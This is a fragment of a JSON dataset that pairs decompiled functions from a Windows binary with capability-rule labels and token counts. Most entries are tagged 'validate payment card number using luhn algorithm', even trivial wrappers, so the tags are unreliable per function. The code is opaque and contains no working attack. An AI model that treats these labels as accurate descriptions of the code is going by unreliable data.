        "decompiled_code": "\nvoid __fastcall fcn.00416ea4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x416eb7;\n    (**(*param_2 + 0x20))();\n    uStack24 = 0x416f44;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.00416a48();\n    if (cVar1 == '\\0') {\n        fcn.0041439c();\n    }\n    while( true ) {\n        cVar1 = fcn.00416a48();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.00416d8c();\n        if (cVar1 - 2U < 3) {\n            fcn.004178fc();\n        }\n        fcn.0041437c();\n        fcn.004179ac();\n        while( true ) {\n            cVar1 = fcn.00416a48();\n            if (cVar1 != '\\0') break;\n            fcn.00417b18();\n        }\n        fcn.004179b4();\n    }\n    fcn.004179b4();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x416f4b;\n    uStack24 = 0x416f43;\n    (**(*param_2 + 0x24))();\n    return;\n}\n",
        "token_count": 372
    },
    "00417610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00417610(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        puStack32 = 0x417632;\n        cVar3 = fcn.00416a48();\n        if (cVar3 != '\\0') break;\n        puStack32 = 0x41762a;\n        fcn.00417b18();\n    }\n    puStack32 = 0x41763e;\n    fcn.004179b4();\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = *(in_EAX + 0x28);\n    puStack32 = 0x41765b;\n    uVar4 = fcn.00403454();\n    *(in_EAX + 0x2c) = uVar4;\n    uStack36 = 0x4176d2;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar5 = fcn.00403454();\n    *(in_EAX + 0x28) = iVar5;\n    if (iVar5 == 0) {\n        *(in_EAX + 0x28) = *(in_EAX + 0x18);\n    }\n    while( true ) {\n        cVar3 = fcn.00416a48();\n        if (cVar3 != '\\0') break;\n        fcn.00417364();\n    }\n    fcn.004179b4();\n    *in_FS_OFFSET = uStack40;\n    *(in_EAX + 0x2c) = uVar1;\n    *(in_EAX + 0x28) = uVar2;\n    return;\n}\n",
        "token_count": 458
    },
    "00417724": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.00417724(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    float fStack16;\n    \n    cVar2 = fcn.004187ec();\n    if (cVar2 == '\\x0f') {\n        fcn.00416db0();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.00417968();\n        fStack16 = iVar1;\n    }\n    return fStack16;\n}\n",
        "token_count": 133
    },
    "00417768": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.00417768(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int64_t iStack20;\n    \n    cVar2 = fcn.004187ec();\n    if (cVar2 == '\\x10') {\n        fcn.00416db0();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.00417968();\n        iStack20 = ROUND(iVar1 * *0x4177b4);\n    }\n    return iStack20;\n}\n",
        "token_count": 144
    },
    "004177b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.004177b8(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.004187ec();\n    if (cVar2 == '\\x11') {\n        fcn.00416db0();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.00417968();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 133
    },
    "004178fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004178fc(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    char cStack8;\n    uchar uStack7;\n    int16_t iStack6;\n    \n    cVar1 = fcn.004187ec();\n    if (cVar1 == '\\x02') {\n        fcn.00416db0();\n        iStack12 = cStack8;\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.00416db0();\n        iStack12 = iStack6;\n    }\n    else if (cVar1 == '\\x04') {\n        fcn.00416db0();\n    }\n    else {\n        fcn.00416888();\n    }\n    return CONCAT26(iStack6, CONCAT15(uStack7, CONCAT14(cStack8, iStack12)));\n}\n",
        "token_count": 185
    },
    "00417968": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00417968(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    int32_t iStack8;\n    \n    cVar1 = fcn.00416d8c();\n    if (cVar1 == '\\x13') {\n        fcn.004187ec();\n        fcn.00416db0();\n    }\n    else {\n        iStack12 = fcn.004178fc();\n        iStack8 = iStack12 >> 0x1f;\n    }\n    return CONCAT44(iStack8, iStack12);\n}\n",
        "token_count": 124
    },
    "00417cf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417cf8(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = fcn.00413558();\n    if ((pcVar2 != NULL) && (cVar1 = (*pcVar2)(),  cVar1 != '\\0')) {\n        fcn.00410a68();\n        return;\n    }\n    fcn.00416888();\n    return;\n}\n",
        "token_count": 108
    },
    "004181a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004181a4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403ffc();\n    while( true ) {\n        cVar1 = fcn.004136f0();\n        if (cVar1 != '\\0') break;\n        fcn.00408cb8(param_2);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0041864c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041864c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4186f9;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.00416d8c();\n    if ((cVar1 == '\\x12') || (cVar1 == '\\x14')) {\n        fcn.00418708();\n        fcn.00404230();\n    }\n    else {\n        cVar1 = fcn.004187ec();\n        if (cVar1 == '\\x06') {\n            fcn.00416db0();\n        }\n        else if (cVar1 == '\\f') {\n            fcn.00416db0();\n        }\n        else {\n            fcn.00416888();\n        }\n        fcn.004045f4();\n        fcn.00416db0();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x418700;\n    uStack28 = 0x4186f8;\n    fcn.00404688();\n    return;\n}\n",
        "token_count": 300
    },
    "00418708": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418708(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4187df;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.00416d8c();\n    if ((cVar1 == '\\x06') || (cVar1 == '\\f')) {\n        fcn.0041864c();\n        fcn.004047d4();\n    }\n    else {\n        cVar1 = fcn.004187ec();\n        if (cVar1 == '\\x12') {\n            fcn.00416db0();\n            fcn.004048d0();\n            fcn.00416db0();\n        }\n        else if (cVar1 == '\\x14') {\n            fcn.00416db0();\n            fcn.004045f4();\n            fcn.00416db0();\n            fcn.00405a18();\n        }\n        else {\n            fcn.00416888();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4187e6;\n    uStack32 = 0x4187d6;\n    fcn.00403fa8();\n    uStack32 = 0x4187de;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 355
    },
    "00418ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.00418ae0(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.00418ae0::var_1h + 1;\n    uStack36 = 0x418b78;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &fcn.00418ae0::var_1h + 1;\n    if (param_2 != '\\0') {\n        (**(*in_EAX + 0x24))();\n        fcn.00418610();\n        fcn.00418610();\n        puVar1 = puStack32;\n    }\n    while( true ) {\n        puStack32 = puVar1;\n        cVar2 = fcn.00416a48();\n        if (cVar2 != '\\0') break;\n        fcn.00418a98();\n        puVar1 = puStack32;\n    }\n    fcn.004179b4();\n    while( true ) {\n        cVar2 = fcn.00416a48();\n        if (cVar2 != '\\0') break;\n        fcn.00418ae0();\n    }\n    fcn.004179b4();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x418b7f;\n    uStack36 = 0x418b77;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 408
    },
    "00418cf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418cf4(uint param_1, int32_t param_2)\n\n{\n    if (0 < param_2) {\n        do {\n            if (param_2 < 0x101) {\n                fcn.00416db0();\n                param_2 = 0;\n            }\n            else {\n                fcn.00416db0();\n                param_2 = param_2 + -0x100;\n            }\n        } while (0 < param_2);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "00418d3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418d3c(uint arg_8h)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x418ee5;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x418d68;\n    fcn.00416914();\n    puStack52 = 0x418d79;\n    fcn.00403228();\n    uStack56 = 0x418ec0;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00403228();\n    fcn.00416db0();\n    fcn.00415840(var_10h, var_10h >> 0x1f);\n    fcn.00416db0();\n    puStack76 = 0x418de2;\n    fcn.004161d0(0x400);\n    uStack80 = 0x418e9b;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.0041864c();\n    fcn.00416db0();\n    fcn.00415840(var_10h, var_10h >> 0x1f);\n    fcn.00416db0();\n    cVar1 = fcn.00410568();\n    if (cVar1 != '\\0') {\n        fcn.00405648();\n        cVar1 = fcn.0040cf50();\n        if (cVar1 != '\\0') goto code_r0x00418e6e;\n    }\n    fcn.0040b5f4();\n    fcn.004039e4();\ncode_r0x00418e6e:\n    *in_EAX = *(var_14h + 4);\n    (**(_pe_dos_header + 0xc))();\n    *in_FS_OFFSET = var_10h;\n    iStack84 = 0x418ea2;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 618
    },
    "0041951c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041951c(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x24) = *0x419564;\n    if (param_1 != 0) {\n        fcn.004196d4();\n    }\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 187
    },
    "00419a74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419a74(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    bool bVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    bVar2 = *0x10 == 0x14;\n    fcn.004043b4();\n    if (!bVar2) {\n        if (param_2 != 0) {\n            cVar1 = fcn.00407da0();\n            if (cVar1 == '\\0') {\n                uStack16 = 0xb;\n                iStack20 = param_2;\n                fcn.0040b630(0, &iStack20);\n                fcn.004039e4();\n            }\n        }\n        if (in_EAX[1] == NULL) {\n            (**(*in_EAX + 0x20))(param_2);\n        }\n        else {\n            (**(*in_EAX[1] + 0x20))(param_2);\n        }\n        fcn.00419bf4();\n        fcn.00419b00();\n        fcn.00419bf4();\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "00419bf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419bf4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    if (*(in_EAX + 4) != 0) {\n        fcn.00404244();\n        piVar1 = fcn.0040352c();\n        if (piVar1 != NULL) {\n            if (param_2 == '\\0') {\n                *piVar1 = 0;\n            }\n            else {\n                *piVar1 = in_EAX;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00419e24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00419e24(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041951c();\n    uVar1 = fcn.00403228();\n    *(in_EAX + 0x50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 169
    },
    "0041a014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041a014(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040357c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00403228();\n    *(in_EAX + 0xc) = in_ECX;\n    *(in_EAX + 0x10) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 187
    },
    "0041a584": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a584(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 67
    },
    "0041bbe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041bbe8(ushort param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    ushort extraout_CX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_1 = extraout_CX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x20) = param_1;\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 170
    },
    "0041bc48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041bc48(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 41
    },
    "0041bc54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041bc54(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 42
    },
    "0041bdf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bdf4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x41be0d;\n    fcn.0041bc48();\n    uStack32 = 0x41be5d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = *(param_2 + 0x10);\n    puStack28 = &stack0xfffffffc;\n    iVar2 = fcn.0041bc60();\n    *(param_2 + 0x10) = iVar2;\n    if (iVar1 != iVar2) {\n        fcn.00403454();\n    }\n    fcn.0041bd44();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41be64;\n    uStack32 = 0x41be5c;\n    fcn.0041bc54();\n    return;\n}\n",
        "token_count": 266
    },
    "0041bf44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041bf44(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    puStack24 = 0x41bf5b;\n    iVar1 = fcn.00413ed0();\n    uStack28 = 0x41bfe1;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    while (var_4h < *(iVar1 + 8)) {\n        fcn.00413b64();\n        fcn.0041d510();\n        var_4h = var_4h + 1;\n        fcn.0041d824();\n    }\n    fcn.0041bed8();\n    fcn.0041bed8();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41bfe8;\n    if (-1 < var_4h + -1) {\n        do {\n            uStack28 = 0x41bfcd;\n            fcn.00413b64();\n            uStack28 = 0x41bfd2;\n            fcn.0041d6fc();\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    uStack28 = 0x41bfe0;\n    fcn.00413f34();\n    return;\n}\n",
        "token_count": 357
    },
    "0041c71c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041c71c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    *0x461418 = 0;\n    uVar1 = fcn.0041bc60();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 0xff000008;\n    *(in_EAX + 0x1c) = *0x463894;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 209
    },
    "0041c7b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c7b4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x41c7cf;\n    cVar1 = fcn.004033e4();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x41c7df;\n        fcn.0041c474();\n        uStack24 = 0x41c86f;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x41c7f7;\n        puStack20 = &stack0xfffffffc;\n        fcn.0041c474();\n        uStack36 = 0x41c852;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.0041be6c();\n        fcn.0041c8f0();\n        if (*(in_EAX + 0x1c) != *(param_2 + 0x1c)) {\n            fcn.0041cb74();\n            fcn.0041cb90();\n        }\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x41c859;\n        uStack36 = 0x41c851;\n        fcn.0041c484();\n        return;\n    }\n    puStack20 = 0x41c881;\n    fcn.00414120();\n    return;\n}\n",
        "token_count": 414
    },
    "0041caac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041caac(void)\n\n{\n    fcn.0041c668();\n    fcn.0041c8a0();\n    return;\n}\n",
        "token_count": 36
    },
    "0041cad8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041cad8(void)\n\n{\n    fcn.0041c888();\n    fcn.0041c8a0();\n    return;\n}\n",
        "token_count": 36
    },
    "0041cbbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041cbbc(uint param_1, uchar param_2)\n\n{\n    fcn.0041c888(param_2);\n    fcn.0041c8a0();\n    return;\n}\n",
        "token_count": 49
    },
    "0041cc48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041cc48(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.0041bc60();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 4;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 176
    },
    "0041ccb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ccb4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x41cccf;\n    cVar1 = fcn.004033e4();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x41ccdf;\n        fcn.0041c474();\n        uStack24 = 0x41cd53;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x41ccf7;\n        puStack20 = &stack0xfffffffc;\n        fcn.0041c474();\n        uStack36 = 0x41cd36;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.0041be6c();\n        fcn.0041ce9c();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x41cd3d;\n        uStack36 = 0x41cd35;\n        fcn.0041c484();\n        return;\n    }\n    puStack20 = 0x41cd65;\n    fcn.00414120();\n    return;\n}\n",
        "token_count": 342
    },
    "0041cddc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041cddc(void)\n\n{\n    fcn.0041cd6c();\n    fcn.0041cd84();\n    return;\n}\n",
        "token_count": 36
    },
    "0041ceb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ceb8(void)\n\n{\n    fcn.0041cd6c();\n    fcn.0041cd84();\n    return;\n}\n",
        "token_count": 35
    },
    "0041cee8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041cee8(uint param_1, int32_t param_2)\n\n{\n    if (-1 < param_2) {\n        fcn.0041cd6c();\n        fcn.0041cd84();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "0041cf14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041cf14(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.0041bc60();\n    *(in_EAX + 0x10) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 161
    },
    "0041cf7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041cf7c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x41cf97;\n    cVar1 = fcn.004033e4();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x41cfa3;\n        fcn.0041c474();\n        uStack24 = 0x41d00c;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x41cfbb;\n        puStack20 = &stack0xfffffffc;\n        fcn.0041c474();\n        uStack36 = 0x41cfef;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.0041be6c();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x41cff6;\n        uStack36 = 0x41cfee;\n        fcn.0041c484();\n        return;\n    }\n    puStack20 = 0x41d01e;\n    fcn.00414120();\n    return;\n}\n",
        "token_count": 334
    },
    "0041d090": {
        "rules": [
